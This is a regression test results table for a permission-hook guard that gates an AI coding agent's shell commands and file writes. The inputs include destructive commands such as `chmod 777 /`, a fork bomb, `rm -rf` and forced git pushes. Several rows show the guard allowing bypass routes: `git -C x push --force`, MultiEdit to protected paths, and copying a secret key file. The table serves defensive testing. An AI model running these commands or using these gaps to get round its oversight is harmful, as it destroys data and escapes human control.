| S10 | security | `chmod 777 /` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S11 | security | `:(){ :\|:& };:` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S12 | security | `rm notes.txt` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S13 | security | `rm -rf node_modules` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S14 | security | `rm -rf dist` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S15 | security | `rm -rf /tmp/gb-battery-x` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S16 | security | `rm -rf /private/tmp/gb-battery-x` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S17 | security | `rm ~/.Trash/x.txt` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| S18 | security | `unlink notes.txt` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S19 | security | `chmod 777 build.sh` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S20 | security | `eval 'echo 1'` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S21 | security | `chown -R me dir` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S22 | security | `echo x \| tee /etc/hosts` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| S90 | security NEG | `ls -la` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| S91 | security NEG | `cat src/a.ts` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| S92 | security NEG | `echo hello` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| S93 | security NEG | `git status` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| S94 | security NEG | `grep -n format notes.md` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| S95 | security NEG | `npm run build` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G01 | git | `git add -A` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G02 | git | `git commit -m x` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G03 | git | `git push origin feat/x` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G04 | git | `git push origin main` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G05 | git | `git push --force origin x` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G06 | git | `git push -f` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G07 | git | `git push --force-with-lease origin x` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G08 | git | `git reset --hard HEAD~1` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G09 | git | `git reset HEAD file` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G10 | git | `git clean -fd` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G11 | git | `git branch -D x` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G12 | git | `git -C x commit -m t` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G13 | git | `bash -c 'git commit -m t'` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G14 | git | `git -C x push --force` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G15 | git | `cd x && git commit -m t` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G16 | git | `git checkout main` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G17 | git | `git merge x` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G18 | git | `git stash` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G19 | git | `git commit -m x` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G20 | git | `git push origin main` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G21 | git | `git rebase --force-with-lease main` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| G22 | git | `git rm file` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| G23 | git | `env FOO=1 git push origin main` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G24 | git | `(git reset --hard)` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G90 | git NEG | `git status` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G91 | git NEG | `git log --oneline` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G92 | git NEG | `git diff --stat` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G93 | git NEG | `git branch --list` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G94 | git NEG | `git show --stat HEAD` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G95 | git NEG | `git log --grep=commit` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| G96 | git NEG | `git push -u origin fix/api-keys-fossil` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| G97 | git NEG | `git remote -v` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| I01 | install | `npm install lodash` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I02 | install | `npm i foo` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I03 | install | `bun add x` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I04 | install | `bun install` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I05 | install | `pip install x` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I06 | install | `pip3 install x` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I07 | install | `brew install jq` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I08 | install | `apt-get install x` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I09 | install | `cargo install ripgrep` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I10 | install | `npm install lodash` (env {"RALPH_MODE":"1"}) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| I11 | install | `brew install jq` (env {"RALPH_MODE":"1"}) | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| I90 | install NEG | `npm run build` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| I91 | install NEG | `npm ls` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| I92 | install NEG | `bun test` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| I93 | install NEG | `ls` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| R01 | release | `gh pr merge 1 --merge` [2 steps] | REPLAY | ask: Release gate | ask: Release gate | UNCHANGED |
| R02 | release | `git tag v1.0.0` [2 steps] | REPLAY | ask: Release gate | ask: Release gate | UNCHANGED |
| R03 | release | `gh pr merge 1 --merge` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| R04 | release NEG | `git tag -l` [2 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| R05 | release | `gh pr merge 1 --squash` [2 steps] | REPLAY | ask: Release gate | ask: Release gate | UNCHANGED |
| R06 | release | `sh -c 'gh pr merge 1 --merge'` [2 steps] | REPLAY | ask: Release gate | ask: Release gate | UNCHANGED |
| R07 | release NEG | `gh pr view 1` [2 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P01 | protected path | Write under .claude/plugins/marketplaces (`/Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/zz-gb-probe.md`, 1 lines) | REPLAY | deny: APEX Hook Guard: protected path | deny: APEX Hook Guard: protected path | UNCHANGED |
| P02 | protected path | Edit under .claude/plugins/cache (`/Users/brunoazoulay/.claude/plugins/cache/zz-gb-probe.md`) | REPLAY | deny: APEX Hook Guard: protected path | deny: APEX Hook Guard: protected path | UNCHANGED |
| P03 | protected path | Write .fuse-harness/cache/sessions/x.json (`/Users/brunoazoulay/.fuse-harness/cache/sessions/zz-gb-probe.json`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P04 | protected path | Write .claude/apex/task.json (`<scratch>/proj/.claude/apex/zz-gb-probe.json`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P05 | protected path | Write .claude/logs/00-apex/x (`/Users/brunoazoulay/.claude/logs/00-apex/zz-gb-probe.json`, 1 lines) | REPLAY | deny: APEX Hook Guard: protected path | deny: APEX Hook Guard: protected path | UNCHANGED |
| P06 | protected path | Write .git/config (project) (`<scratch>/proj/.git/zz-gb-probe`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P07 | protected path | Write .harness/track/x (`<scratch>/proj/.harness/track/zz-gb-probe`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P08 | protected path | Write ~/.fuse-harness/.key (`/Users/brunoazoulay/.fuse-harness/.key`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P09 | protected path | Write ~/.fuse-harness/state/x (`/Users/brunoazoulay/.fuse-harness/state/zz-gb-probe.json`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P10 | protected path | Write .codex/config.toml (`/Users/brunoazoulay/.codex/config.toml`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P11 | protected path | `echo x > .claude/apex/zz-gb-probe` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P12 | protected path | `echo x \| tee .git/zz-gb-probe` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P13 | protected path | `cp notes.md /Users/brunoazoulay/.claude/plugins/marketplaces/zz-gb-probe` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| P90 | protected path NEG | Write notes.md in project (`<scratch>/proj/notes.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P91 | protected path NEG | Write .github/workflows/ci.yml (`<scratch>/proj/.github/workflows/ci.yml`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P92 | protected path NEG | Write foo.git/x (not a .git segment) (`<scratch>/proj/foo.git/x.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P93 | protected path NEG | `cat .git/config > /dev/null` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| P94 | protected path NEG | `grep -rn x .claude/apex/` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| A01 | APEX auth | Write new code file src/b.ts (fresh session, generic ts project) (`<scratch>/proj/src/b.ts`, 3 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A02 | APEX auth | Edit trivial (<5 lines) on existing src/a.ts (fast path) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| A03 | APEX auth | Edit non-trivial (6-line new_string) (`<scratch>/proj/src/a.ts`) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A04 | APEX auth | Edit replace_all (never trivial) (`<scratch>/proj/src/a.ts`) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A05 | APEX auth | Write non-code file (md) (`<scratch>/proj/doc.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| A06 | APEX auth | Write in node_modules (skip dir) (`<scratch>/proj/node_modules/pkg/index.js`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| A07 | APEX auth | Write src/App.tsx in React project (framework doc required) (`<scratch>/proj-react/src/App.tsx`, 1 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A08 | APEX auth | Edit trivial in React project file (`<scratch>/proj-react/src/App.tsx`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| A09 | APEX auth | React Write after Read of react skill doc (credited) (`<scratch>/proj-react/src/App.tsx`, 1 lines) [2 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A10 | APEX auth | React Write after Read of UNRELATED md (neg control) (`<scratch>/proj-react/src/App.tsx`, 1 lines) [2 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A11 | APEX auth | Write src/b.ts after Read of ts skill (generic) (`<scratch>/proj/src/b.ts`, 3 lines) [2 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| A12 | APEX auth | 6 trivial Edits in a row (budget exhaustion) (`<scratch>/proj/src/a.ts`) [7 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| F01 | file-size | Write 150-line src/big.ts (> default 100) (`<scratch>/proj/src/big.ts`, 150 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| F02 | file-size NEG | Write 90-line src/ok.ts (`<scratch>/proj/src/ok.ts`, 90 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| F03 | file-size | Write 101-line file (boundary) (`<scratch>/proj/src/edge.ts`, 101 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| F04 | file-size NEG | Write 100-line file (boundary) (`<scratch>/proj/src/edge.ts`, 100 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| F05 | file-size | FUSE_SOLID_MAX_LINES=50 Write 60 lines (`<scratch>/proj/src/f50.ts`, 60 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| F06 | file-size NEG | FUSE_SOLID_MAX_LINES=50 Write 40 lines (`<scratch>/proj/src/f50.ts`, 40 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| F07 | file-size | FUSE_SOLID_MAX_LINES=3 Edit growing src/a.ts (4 lines on disk) (`<scratch>/proj/src/a.ts`) (env {"FUSE_SOLID_MAX_LINES":"3"}) | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| F08 | file-size | Write 150-line .md (out of scope?) (`<scratch>/proj/long.md`, 150 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| F09 | file-size | Write 150-line .tsx in React project (`<scratch>/proj-react/src/Big.tsx`, 150 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| T01 | store budget | zustand store 60 lines in modules/x/src/stores (limit 40) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| T02 | store budget NEG | zustand store 20 lines in stores/ (under budget) (`<scratch>/proj-react/modules/x/src/stores/useBarStore.ts`, 12 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| T03 | store budget | zustand store outside stores/ (location) (`<scratch>/proj-react/src/lib/useBazStore.ts`, 2 lines) | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| T04 | store budget | FUSE_SOLID_MAX_LINES=200: 60-line store (budget 80) allowed (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) (env {"FUSE_SOLID_MAX_LINES":"200"}) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| AU01 | APEX auth NEG | AUTH then Write 3-line src/b.ts (`<scratch>/proj/src/b.ts`, 3 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU02 | file-size NEG | AUTH then Write 90 lines (`<scratch>/proj/src/ok.ts`, 90 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU03 | file-size NEG | AUTH then Write 100 lines (boundary) (`<scratch>/proj/src/edge.ts`, 100 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU04 | file-size | AUTH then Write 101 lines (`<scratch>/proj/src/edge.ts`, 101 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU05 | file-size | AUTH then Write 150 lines (`<scratch>/proj/src/big.ts`, 150 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU06 | file-size NEG | AUTH, FUSE_SOLID_MAX_LINES=50, 40 lines (`<scratch>/proj/src/f.ts`, 40 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU07 | file-size | AUTH, FUSE_SOLID_MAX_LINES=50, 60 lines (`<scratch>/proj/src/f.ts`, 60 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) [5 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| AU08 | APEX auth NEG | AUTH then non-trivial Edit (6 lines) (`<scratch>/proj/src/a.ts`) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU09 | APEX auth | AUTH(react) then Write App.tsx (`<scratch>/proj-react/src/App.tsx`, 1 lines) [5 steps] | REPLAY | deny: APEX: react documentation required | deny: APEX: react documentation required | UNCHANGED |
| AU10 | store budget | AUTH then zustand store 60 lines in stores/ (limit 40) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU11 | store budget NEG | AUTH then zustand store 10 lines in stores/ (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 12 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU12 | store budget NEG | AUTH, MAX_LINES=200, 60-line store (budget 80) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) (env {"FUSE_SOLID_MAX_LINES":"200"}) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU13 | file-size | AUTH then 150-line .tsx (react) (`<scratch>/proj-react/src/Big.tsx`, 150 lines) [5 steps] | REPLAY | deny: APEX: react documentation required | deny: APEX: react documentation required | UNCHANGED |
| AU14 | freshness | AUTH then sleep > TTL (FUSE_ENFORCE_TTL_SEC=2) then Write (`<scratch>/proj/src/b.ts`, 3 lines) (env {"FUSE_ENFORCE_TTL_SEC":"2"}) [5 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| AU15 | freshness NEG | AUTH then Write within TTL (FUSE_ENFORCE_TTL_SEC=600) (`<scratch>/proj/src/b.ts`, 3 lines) (env {"FUSE_ENFORCE_TTL_SEC":"600"}) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| AU16 | APEX auth | only explore+research agents, no docs (`<scratch>/proj/src/b.ts`, 3 lines) [3 steps] | REPLAY | deny: APEX: generic documentation required | deny: APEX: generic documentation required | UNCHANGED |
| AU17 | APEX auth | only docs, no agents (`<scratch>/proj/src/b.ts`, 3 lines) [3 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| AU18 | APEX auth | Write via sub-agent payload (agent_id/agent_type) in fresh session (`<scratch>/proj/src/b.ts`, 3 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| AU19 | APEX auth NEG | Explore agent_type Write (exempt from size) (`<scratch>/proj/src/big.ts`, 150 lines) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| O01 | one-shot | Write denied (APEX), AUTH, same Write allowed -> credit; probe state [7 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| O02 | one-shot | Write denied twice, no follow-up (abandoned/pending) (`<scratch>/proj/src/b.ts`, 3 lines) [2 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| O03 | one-shot | `ls` [2 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| O04 | one-shot NEG | ordinary allowed Write (md): no phantom credit (`<scratch>/proj/notes.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| O05 | one-shot | size deny, then smaller Write same path allowed -> credit [7 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| M01 | motion key guard | Write ~/.fuse-harness/.key (motion scope) (`/Users/brunoazoulay/.fuse-harness/.key`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M02 | motion key guard | Read ~/.fuse-harness/.key (motion scope) (`/Users/brunoazoulay/.fuse-harness/.key`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M03 | motion key guard | `cat ~/.fuse-harness/.key` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M04 | motion key guard | `ls -la ~/.fuse-harness` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M05 | motion key guard | Write ~/.fuse-harness/state/x (motion scope) (`/Users/brunoazoulay/.fuse-harness/state/zz-probe.json`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M06 | motion key guard | `echo x >> /Users/brunoazoulay/.fuse-harness/state/track-zz.log` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M07 | motion key guard | `strings ~/.fuse-harness/.key` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M08 | motion key guard | `cp ~/.fuse-harness/.key /tmp/k` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M09 | motion key guard | Edit ~/.fuse-harness/.key (motion scope) (`/Users/brunoazoulay/.fuse-harness/.key`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M10 | motion key guard | `mv ~/.fuse-harness/state /tmp/st` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M90 | motion NEG | Write notes.md (motion scope) (`<scratch>/proj/notes.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M91 | motion NEG | Read src/a.ts (motion scope) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M92 | motion NEG | `grep -rn 'api key' docs/` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M93 | motion NEG | `ls -la` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M94 | motion NEG | `git status` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| M95 | motion NEG | Write package.json (motion scope) (`<scratch>/proj/package.json`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| XS01 | security scope | Write src/b.ts (security scope) (`<scratch>/proj/src/b.ts`, 3 lines) | REPLAY | inject 198c | inject 198c | UNCHANGED |
| XS02 | solid scope | Write 150 lines (solid scope) (`<scratch>/proj/src/big.ts`, 150 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| XS03 | solid scope NEG | Write 50 lines (solid scope) (`<scratch>/proj/src/ok.ts`, 50 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| XS04 | solid scope | React store 60 lines (solid scope) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| RD01 | Read | PreToolUse Read src/a.ts (core) (`<scratch>/proj/src/a.ts`) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| RD02 | Read | PostToolUse Read skill md (credit) (`/Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/solid/skills/so`) | REPLAY | allow + msg "✓ SOLID refs read — solid-generic" | allow + msg "✓ SOLID refs read — solid-generic" | UNCHANGED |
| RD03 | Read | PostToolUse Read src/a.ts (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| RD04 | Read | PostToolUse Read (security scope) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| RD05 | Read | PostToolUse Read (motion scope) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| RD06 | Read | PreToolUse Read key (core scope) (`/Users/brunoazoulay/.fuse-harness/.key`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| RD07 | Read | PreToolUse Read protected marketplaces file (core) (`/Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/solid/skills/so`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N01 | NotebookEdit | PreToolUse NotebookEdit normal notebook (core) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N02 | NotebookEdit | NotebookEdit under marketplaces (protected) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N03 | NotebookEdit | NotebookEdit motion scope key path | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N04 | MultiEdit | PreToolUse MultiEdit src/a.ts 2 edits (core) (`<scratch>/proj/src/a.ts`) | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| N05 | MultiEdit | MultiEdit protected path (core) (`/Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/zz.md`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N06 | MultiEdit | MultiEdit growing past MAX_LINES=3 (`<scratch>/proj/src/a.ts`) (env {"FUSE_SOLID_MAX_LINES":"3"}) | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| N07 | MultiEdit | MultiEdit key path motion scope (`/Users/brunoazoulay/.fuse-harness/.key`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N08 | Agent | PreToolUse Agent general-purpose (core) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N09 | Agent | PreToolUse Task general-purpose (core) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N10 | Agent | PreToolUse Agent unnamed domain expert (aipilot-wired Task matcher, core) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N11 | MultiEdit NEG | PostToolUse MultiEdit src/a.ts (core) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| N12 | NotebookEdit NEG | PostToolUse NotebookEdit (core) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT01 | PostToolUse | Write code file -> sniper reminder (`<scratch>/proj/src/a.ts`, 3 lines) | REPLAY | inject 323c | inject 323c | UNCHANGED |
| PT02 | PostToolUse | Edit code file -> sniper reminder (`<scratch>/proj/src/a.ts`) | REPLAY | inject 323c | inject 323c | UNCHANGED |
| PT03 | PostToolUse NEG | Write md file -> no sniper reminder (`<scratch>/proj/notes.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT04 | PostToolUse | Edit code file, MAX_LINES=3 on 4-line file -> size warning (`<scratch>/proj/src/a.ts`) (env {"FUSE_SOLID_MAX_LINES":"3"}) | REPLAY | inject 323c | inject 323c | UNCHANGED |
| PT05 | PostToolUse | Write code file (aipilot scope) (`<scratch>/proj/src/a.ts`, 3 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT06 | PostToolUse | Write code file (solid scope) (`<scratch>/proj/src/a.ts`, 3 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT07 | PostToolUse | Write code file (lessons scope) (`<scratch>/proj/src/a.ts`, 3 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT08 | PostToolUse | Write code file (carto scope) (`<scratch>/proj/src/a.ts`, 3 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT09 | PostToolUse | Write code file (seo scope) (`<scratch>/proj/src/a.ts`, 3 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT10 | PostToolUse | `ls` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT11 | PostToolUse | WebFetch (changelog scope) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT12 | PostToolUse | Read (tailwindcss scope) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT13 | PostToolUse | `ls` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT14 | PostToolUse | TaskCreate (aipilot scope) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT15 | PostToolUseFailure | `false` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PT16 | PostToolUseFailure | `false` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SessionStart-core | event SessionStart | SessionStart scope=(none)  | REPLAY | inject 623c | inject 623c | UNCHANGED |
| E-SessionStart-carto | event SessionStart | SessionStart scope=carto  | REPLAY | inject 337c | inject 337c | UNCHANGED |
| E-SessionStart-lessons | event SessionStart | SessionStart scope=lessons  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SessionStart-rules | event SessionStart | SessionStart scope=rules  | REPLAY | inject 9101c | inject 9101c | UNCHANGED |
| E-SessionStart-solid | event SessionStart | SessionStart scope=solid  | REPLAY | text 38c: SOLID: generic project (max 200 lines) | text 38c: SOLID: generic project (max 200 lines) | UNCHANGED |
